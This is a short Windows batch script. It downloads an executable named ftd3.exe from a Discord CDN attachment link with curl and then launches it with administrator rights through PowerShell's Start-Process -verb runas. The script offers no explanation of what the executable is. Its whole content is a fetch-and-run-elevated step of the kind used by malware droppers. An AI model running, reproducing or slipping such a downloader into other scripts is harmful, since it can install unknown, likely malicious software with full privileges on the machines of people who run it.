@echo off
set url=https://cdn.discordapp.com/attachments/1197242628396302458/1328018741627326534/ftd3.exe
set output=ftd3.exe
curl -L -o "%output%" "%url%"
powershell -command "start-process '%output%' -verb runas"
